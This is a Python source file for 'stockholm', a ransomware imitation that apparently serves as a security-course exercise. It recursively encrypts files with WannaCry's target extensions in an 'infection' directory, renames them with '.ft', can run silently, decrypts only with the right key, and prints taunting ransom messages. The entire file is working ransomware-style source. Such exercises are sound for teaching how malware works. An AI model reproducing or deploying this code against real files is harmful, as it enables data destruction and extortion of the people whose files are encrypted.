import argparse
import os
import sys
import base64
from dotenv import load_dotenv
from nacl.secret import SecretBox

Args = argparse.Namespace
Parser = argparse.ArgumentParser

HEADER = """
 @@@@@@   @@@@@@@   @@@@@@    @@@@@@@  @@@  @@@  @@@  @@@   @@@@@@   @@@       @@@@@@@@@@   
@@@@@@@   @@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@  @@@@@@@@  @@@       @@@@@@@@@@@  
!@@         @@!    @@!  @@@  !@@       @@!  !@@  @@!  @@@  @@!  @@@  @@!       @@! @@! @@!  
!@!         !@!    !@!  @!@  !@!       !@!  @!!  !@!  @!@  !@!  @!@  !@!       !@! !@! !@!  
!!@@!!      @!!    @!@  !@!  !@!       @!@@!@!   @!@!@!@!  @!@  !@!  @!!       @!! !!@ @!@  
 !!@!!!     !!!    !@!  !!!  !!!       !!@!!!    !!!@!!!!  !@!  !!!  !!!       !@!   ! !@!  
     !:!    !!:    !!:  !!!  :!!       !!: :!!   !!:  !!!  !!:  !!!  !!:       !!:     !!:  
    !:!     :!:    :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!   :!:      :!:     :!:  
:::: ::      ::    ::::: ::   ::: :::   ::  :::  ::   :::  ::::: ::   :: ::::  :::     ::   
:: : :       :      : :  :    :: :: :   :   :::   :   : :   : :  :   : :: : :   :      :    
    """


class Color:
    HEADER = "\033[36m"
    INFO = "\033[96m"
    SUCCESS = "\033[92m"
    WARNING = "\033[93m"
    ERROR = "\033[91m"
    RESET = "\033[0m"


def print_header() -> None:
    for line in HEADER.splitlines():
        print(Color.HEADER + "{:^90}".format(line) + Color.RESET)


# fmt: off
wannacry_extensions: set[str] = {
    ".docx", ".ppam", ".sti", ".vcd", ".3gp", ".sch", ".myd", ".wb2", ".docb",
    ".potx", ".sldx", ".jpeg", ".mp4", ".dch", ".frm", ".slk", ".docm", ".potm",
    ".sldm", ".jpg", ".mov", ".dip", ".odb", ".dif", ".dot", ".pst", ".sldm",
    ".bmp", ".avi", ".pl", ".dbf", ".stc", ".dotm", ".ost", ".vdi", ".png",
    ".asf", ".vb", ".db", ".sxc", ".dotx", ".msg", ".vmdk", ".gif", ".mpeg",
    ".vbs", ".mdb", ".ots", ".xls", ".eml", ".vmx", ".raw", ".vob", ".ps1",
    ".accdb", ".ods", ".xlsm", ".vsd", ".aes", ".tif", ".wmv", ".cmd", ".sql",
    ".sqlitedb", ".max", ".xlsb", ".vsdx", ".ARC", ".tiff", ".fla", ".js",
    ".sqlite3", ".3ds", ".xlw", ".txt", ".PAQ", ".nef", ".swf", ".asm", ".asc",
    ".uot", ".xlt", ".csv", ".bz2", ".psd", ".wav", ".h", ".lay6", ".stw", ".xlm",
    ".rtf", ".tbk", ".ai", ".mp3", ".pas", ".lay", ".sxw", ".xlc", ".123", ".bak",
    ".svg", ".sh", ".cpp", ".mml", ".ott", ".xltx", ".wks", ".tar", ".djvu",
    ".class", ".c", ".sxm", ".odt", ".xltm", ".wk1", ".tgz", ".m4u", ".jar",
    ".cs", ".otg", ".pem", ".ppt", ".pdf", ".gz", ".m3u", ".java", ".suo", ".odg",
    ".p12", ".pptx", ".dwg", ".7z", ".mid", ".rb", ".sln", ".uop", ".csr", ".pptm",
    ".onetoc2", ".rar", ".wma", ".asp", ".ldf", ".std", ".crt", ".pot", ".snt",
    ".zip", ".flv", ".php", ".mdf", ".sxd", ".key", ".pps", ".hwp", ".backup",
    ".3g2", ".jsp", ".ibd", ".otp", ".pfx", ".ppsm", ".602", ".iso", ".mkv", ".brd",
    ".myi", ".odp", ".der", ".ppsx", ".sxi",
}  # fmt: on


def get_master_key() -> str:
    key = os.getenv("MASTER_KEY")
    if key:
        return key
    load_dotenv("/root/.env")
    key = os.getenv("MASTER_KEY")
    if key:
        return key
    load_dotenv("../.env")
    key = os.getenv("MASTER_KEY")
    if key:
        return key
    load_dotenv(".env")
    key = os.getenv("MASTER_KEY")
    if not key:
        raise ValueError("MASTER_KEY not found in .env file")
    return key


def parse_args() -> Args:
    parser: Parser = argparse.ArgumentParser(
        prog="stockholm",
        description="Encrypts and decrypts files using the wannacry algorithm",
    )
    parser.add_argument(
        "-v",
        "--version",
        action="version",
        version="%(prog)s 0.5",
        help="Show program's version",
    )
    parser.add_argument(
        "-r",
        "--reverse",
        type=str,
        default=None,
        help="Decrypt files with the following key",
    )
    parser.add_argument("-s", "--silent", action="store_true", help="Silent mode")
    return parser.parse_args()


class Stockholm:
    def __init__(self, master_key: str):
        self.master_key_b64 = base64.urlsafe_b64encode(
            master_key.encode().ljust(24, b"\0")
        ).decode()
        self.box = SecretBox(self.master_key_b64.encode())
        self.target_directory = os.path.expanduser("~/infection")

    def encrypt(self):
        if not os.path.exists(self.target_directory):
            self.target_directory = "../infection"
            if not os.path.exists(self.target_directory):
                self.target_directory = "./infection"
                if not os.path.exists(self.target_directory):
                    raise ValueError("Target directory not found")

        self._process_directory(self.target_directory, encrypt=True)

    def decrypt(self):
        if not os.path.exists(self.target_directory):
            self.target_directory = "../infection"
            if not os.path.exists(self.target_directory):
                self.target_directory = "./infection"
                if not os.path.exists(self.target_directory):
                    raise ValueError("Target directory not found")

        self._process_directory(self.target_directory, encrypt=False)

    def _process_directory(self, directory, encrypt: bool):
        for entry in os.scandir(directory):
            if entry.is_file():
                if encrypt:
                    self._encrypt_file(entry.path)
                else:
                    self._decrypt_file(entry.path)
            elif entry.is_dir():
                self._process_directory(entry.path, encrypt)

    def _encrypt_file(self, file_path: str):
        if not file_path.endswith(tuple(wannacry_extensions)):
            return

        print(f"{Color.WARNING}Encrypting {file_path}...{Color.RESET}")

        with open(file_path, "r+b") as f:
            data = f.read()
            encrypted_data = self.box.encrypt(data)
            f.seek(0)
            f.write(encrypted_data)
            f.truncate()
        if not file_path.endswith(".ft"):
            os.rename(file_path, file_path + ".ft")

    def _decrypt_file(self, file_path: str):
        if not file_path.endswith(".ft"):
            return

        print(f"{Color.SUCCESS}Decrypting {file_path}...{Color.RESET}")

        with open(file_path, "r+b") as f:
            encrypted_data = f.read()
            decrypted_data = self.box.decrypt(encrypted_data)
            f.seek(0)
            f.write(decrypted_data)
            f.truncate()
        os.rename(file_path, file_path[:-3])

    def _validate_key(self, key: str) -> bool:
        if key == self.master_key_b64:
            return True
        return False


def main() -> None:
    try:
        master_key = get_master_key()
        args: Args = parse_args()
        if args.silent:
            sys.stdout = open(os.devnull, "w")
        print_header()
        stockholm = Stockholm(master_key)
        if args.reverse:
            if stockholm._validate_key(args.reverse):
                stockholm.decrypt()
                print(f"{Color.SUCCESS}\n😇😇😇 You are free now! 😇😇😇{Color.RESET}")
            else:
                print(
                    f"{Color.ERROR}😈😈😈 Invalid key: Good luck next time! 😈😈😈{Color.RESET}"
                )
        else:
            stockholm.encrypt()
            print("\n😈😈😈 All your files are now encrypted! 😈😈😈")
    except Exception as e:
        print(f"{Color.ERROR}Error: {e}{Color.RESET}")


if __name__ == "__main__":
    main()
